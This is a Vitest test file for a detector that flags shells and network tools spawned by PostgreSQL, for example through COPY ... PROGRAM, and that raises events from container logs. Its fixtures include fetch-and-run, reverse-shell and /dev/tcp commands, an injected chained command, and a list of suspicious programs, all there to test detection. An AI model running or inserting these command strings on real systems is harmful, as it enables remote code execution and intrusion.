import { describe, it, expect, vi } from 'vitest';
import type { ThreatEvent } from '../../types/events.js';

vi.mock('../../core/state.js', () => ({ insertEvent: () => {} }));

const {
  parseProcStat,
  matchPostgresShell,
  isSuspiciousProgram,
  isPostgresProcess,
  classifyPostgresShellLine,
  postgresShellLogEvent,
  shellLogDetector,
  postgresShellSettings,
  containerIdFromCgroup,
  PostgresShellWatch,
} = await import('../workers/postgres-shell.js');
const { DockerLogsWatch, dockerLogsSettings } = await import('../workers/docker-logs.js');

/** A fixture /proc: pid → [ppid, comm, cmdline]. */
type Tree = Record<number, [number, string, string]>;

function statLine(pid: number, ppid: number, comm: string, start = 1000 + pid): string {
  // pid (comm) state ppid pgrp session tty tpgid flags minflt cminflt majflt cmajflt utime stime cutime cstime priority nice threads itrealvalue starttime …
  return `${pid} (${comm}) S ${ppid} ${pid} ${pid} 0 -1 4194560 100 0 0 0 0 0 0 0 20 0 1 0 ${start} 1000 100`;
}

function fakeProc(tree: Tree) {
  const killed: number[] = [];
  return {
    killed,
    fs: {
      pids: () => Object.keys(tree).map(Number),
      stat: (pid: number) => (tree[pid] ? statLine(pid, tree[pid][0], tree[pid][1]) : null),
      cmdline: (pid: number) => tree[pid]?.[2] ?? null,
      cgroup: (pid: number) => (pid in tree ? `0::/system.slice/docker-${'ab12cd34ef56'.repeat(5)}abcd.scope\n` : null),
      kill: (pid: number) => { killed.push(pid); delete tree[pid]; },
    },
  };
}

function table(tree: Tree) {
  return {
    get: (pid: number) => (tree[pid] ? { pid, ppid: tree[pid][0], comm: tree[pid][1], starttime: 1 } : undefined),
    cmdline: (pid: number) => tree[pid]?.[2] ?? '',
  };
}

// The dev2 shape: containerd-shim → postgres (supabase wrapper) → backend → sh -c → curl/bash.
const DEV2: Tree = {
  1: [0, 'systemd', '/sbin/init'],
  500: [1, 'containerd-shim', '/usr/bin/containerd-shim-runc-v2 -namespace moby'],
  510: [500, '.postgres-wrapp', '/nix/store/x/bin/.postgres-wrapper -D /etc/postgresql'],
  600: [510, 'postgres', 'postgres: supabase_admin postgres 45.1.2.3(5544) COPY'],
  601: [600, 'sh', 'sh -c curl -s http://198.51.100.9/x.sh | bash'],
  602: [601, 'curl', 'curl -s http://198.51.100.9/x.sh'],
  603: [601, 'bash', 'bash'],
  700: [510, 'postgres', 'postgres: checkpointer'],
  // Not under postgres: an admin's shell and a cron curl.
  800: [1, 'sshd', 'sshd: anthony [priv]'],
  801: [800, 'bash', '-bash'],
  802: [1, 'curl', 'curl https://example.com'],
};

describe('parseProcStat', () => {
  it('reads pid, ppid, comm and starttime, with spaces and parens in comm', () => {
    expect(parseProcStat(statLine(42, 7, 'tmux: server', 12345))).toEqual({ pid: 42, ppid: 7, comm: 'tmux: server', starttime: 12345 });
    expect(parseProcStat(statLine(43, 7, 'a) b (c'))?.comm).toBe('a) b (c');
    expect(parseProcStat('garbage')).toBeNull();
  });
});

describe('process matchers', () => {
  it('knows postgres by comm or argv0', () => {
    expect(isPostgresProcess({ comm: 'postgres' })).toBe(true);
    expect(isPostgresProcess({ comm: '.postgres-wrapp' })).toBe(true);
    expect(isPostgresProcess({ comm: 'postmaster' })).toBe(true);
    expect(isPostgresProcess({ comm: 'x', cmdline: '/usr/lib/postgresql/15/bin/postgres -D /data' })).toBe(true);
    expect(isPostgresProcess({ comm: 'postgrest' })).toBe(false);
  });

  it('flags shells, LOLBins, python and /dev/tcp', () => {
    for (const comm of ['sh', 'bash', 'dash', 'busybox', 'curl', 'wget', 'nc', 'ncat', 'perl', 'base64', 'python3', 'python3.11', 'python']) {
      expect(isSuspiciousProgram({ comm }), comm).toBe(true);
    }
    expect(isSuspiciousProgram({ comm: 'timeout', cmdline: 'timeout 5 bash -c cat</dev/tcp/1.2.3.4/80' })).toBe(true);
    expect(isSuspiciousProgram({ comm: 'timeout', cmdline: 'timeout 5 pg_dump' })).toBe(false);
    expect(isSuspiciousProgram({ comm: 'pg_dump' })).toBe(false);
  });
});

describe('matchPostgresShell (fixture /proc trees)', () => {
  it('finds the sh, curl and bash under the dev2 backend', () => {
    const t = table(DEV2);
    for (const pid of [601, 602, 603]) {
      const hit = matchPostgresShell(pid, t);
      expect(hit, String(pid)).not.toBeNull();
      expect(hit!.postgres.pid).toBe(600);
      expect(hit!.chain[hit!.chain.length - 1].pid).toBe(601);
    }
  });

  it('ignores shells and curl that do not descend from postgres', () => {
    const t = table(DEV2);
    expect(matchPostgresShell(801, t)).toBeNull();
    expect(matchPostgresShell(802, t)).toBeNull();
  });

  it('never matches postgres itself', () => {
    const t = table(DEV2);
    expect(matchPostgresShell(600, t)).toBeNull();
    expect(matchPostgresShell(510, t)).toBeNull();
  });

  it('allows pgsodium getkey exactly, but not with anything chained', () => {
    const allow = postgresShellSettings().allow;
    const ok: Tree = { ...DEV2, 900: [510, 'sh', 'sh -c /usr/share/postgresql/extension/pgsodium_getkey'], 901: [900, 'bash', '/bin/bash /usr/share/postgresql/extension/pgsodium_getkey'] };
    expect(matchPostgresShell(900, table(ok), allow)).toBeNull();
    expect(matchPostgresShell(901, table(ok), allow)).toBeNull();
    const bad: Tree = { ...DEV2, 900: [510, 'sh', 'sh -c /usr/share/postgresql/extension/pgsodium_getkey; curl x|sh'] };
    expect(matchPostgresShell(900, table(bad), allow)).not.toBeNull();
    const wal: Tree = { ...DEV2, 900: [510, 'sh', 'sh -c wal-g wal-push pg_wal/0001'] };
    expect(matchPostgresShell(900, table(wal), allow)).toBeNull();
    const walBad: Tree = { ...DEV2, 900: [510, 'sh', 'sh -c wal-g wal-push x; nc -e /bin/sh 1.2.3.4 9'] };
    expect(matchPostgresShell(900, table(walBad), allow)).not.toBeNull();
  });

  it('survives a parent loop', () => {
    const loop: Tree = { 10: [11, 'sh', 'sh'], 11: [10, 'bash', 'bash'] };
    expect(matchPostgresShell(10, table(loop))).toBeNull();
  });
});

describe('PostgresShellWatch', () => {
  it('raises one critical event per process, with the container', () => {
    const tree: Tree = JSON.parse(JSON.stringify(DEV2));
    const { fs, killed } = fakeProc(tree);
    const events: ThreatEvent[] = [];
    const w = new PostgresShellWatch({ bus: { publish: (e) => events.push(e) }, settings: postgresShellSettings({ enabled: true }), log: () => {}, procfs: fs });
    const first = w.poll();
    expect(first.map((e) => e.details?.pid).sort()).toEqual([601, 602, 603]);
    expect(first.every((e) => e.severity === 'critical' && e.details?.rule_id === 'postgres-shell-exec')).toBe(true);
    expect(first[0].details?.container).toBe('ab12cd34ef56');
    expect(w.poll()).toEqual([]);
    expect(killed).toEqual([]);
  });

  it('kills the spawned tree when kill = true, never postgres', () => {
    const tree: Tree = JSON.parse(JSON.stringify(DEV2));
    const { fs, killed } = fakeProc(tree);
    const w = new PostgresShellWatch({ bus: { publish: () => {} }, settings: { ...postgresShellSettings({ kill: true }), enabled: true }, log: () => {}, procfs: fs });
    w.poll();
    expect(killed.sort()).toEqual([601, 602, 603]);
    expect(tree[600]).toBeDefined();
    expect(tree[510]).toBeDefined();
  });

  it('does not kill in dry_run', () => {
    const tree: Tree = JSON.parse(JSON.stringify(DEV2));
    const { fs, killed } = fakeProc(tree);
    const w = new PostgresShellWatch({ bus: { publish: () => {} }, settings: { ...postgresShellSettings({ kill: true }), enabled: true }, dryRun: () => true, log: () => {}, procfs: fs });
    const events = w.poll();
    expect(killed).toEqual([]);
    expect(events[0].message).toContain('dry_run');
  });
});

describe('container id from cgroup', () => {
  it('reads docker v1 and v2 cgroup paths', () => {
    const id = 'f'.repeat(64);
    expect(containerIdFromCgroup(`0::/system.slice/docker-${id}.scope`)).toBe('f'.repeat(12));
    expect(containerIdFromCgroup(`12:pids:/docker/${id}`)).toBe('f'.repeat(12));
    expect(containerIdFromCgroup('0::/user.slice')).toBeUndefined();
  });
});

describe('Postgres container log patterns', () => {
  it('flags COPY … PROGRAM in statements and errors', () => {
    expect(classifyPostgresShellLine(`45.1.2.3 2026-11-20 03:12:01 UTC [9] postgres@postgres LOG:  statement: COPY t FROM PROGRAM 'id'`)).toBe('copy_program');
    expect(classifyPostgresShellLine(`2026-11-20 03:12:01 UTC [9] STATEMENT:  copy cmd_exec to program 'curl x'`)).toBe('copy_program');
  });

  it('flags plain shell errors and job-control output', () => {
    for (const line of ['sh: 1: curl: not found', 'bash: line 1: wget: command not found', '/bin/sh: 1: nc: not found', 'Killed', 'Terminated  sleep 100', '[1]+  Terminated  ./x', 'Quit (core dumped)']) {
      expect(classifyPostgresShellLine(line), line).toBe('shell_output');
    }
  });

  it('leaves ordinary Postgres lines alone', () => {
    for (const line of [
      '2026-11-20 03:12:01 UTC [9] LOG:  checkpoint complete',
      '2026-11-20 03:12:01 UTC [9] FATAL:  terminating connection due to administrator command',
      '/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/init.sql',
      'PostgreSQL init process complete; ready for start up.',
    ]) {
      expect(classifyPostgresShellLine(line), line).toBeNull();
    }
  });

  it('makes COPY PROGRAM critical and shell output high', () => {
    expect(postgresShellLogEvent(`LOG: COPY x FROM PROGRAM 'id'`, 'supabase-db')?.severity).toBe('critical');
    expect(postgresShellLogEvent('sh: 1: curl: not found', 'supabase-db')?.severity).toBe('high');
  });

  it('cools down per container and kind', () => {
    let now = 0;
    const detect = shellLogDetector(60_000, () => now);
    expect(detect('sh: 1: a: not found', 'db')).not.toBeNull();
    expect(detect('sh: 1: b: not found', 'db')).toBeNull();
    expect(detect(`COPY x FROM PROGRAM 'id'`, 'db')).not.toBeNull();
    expect(detect('sh: 1: a: not found', 'db2')).not.toBeNull();
    now = 61_000;
    expect(detect('sh: 1: c: not found', 'db')).not.toBeNull();
  });

  it('reaches the bus through the docker-logs watcher', () => {
    const events: ThreatEvent[] = [];
    const w = new DockerLogsWatch({
      bus: { publish: (e) => events.push(e) },
      settings: dockerLogsSettings(),
      log: () => {},
      deps: { getJson: async () => [], stream: () => ({ destroy() {} }) as never },
    });
    w.line(`2026-11-20 03:12:01 UTC [9] LOG:  statement: COPY t FROM PROGRAM 'curl x|sh'`, 'supabase-db');
    expect(events).toHaveLength(1);
    expect(events[0].details?.rule_id).toBe('postgres-copy-program');
  });
});
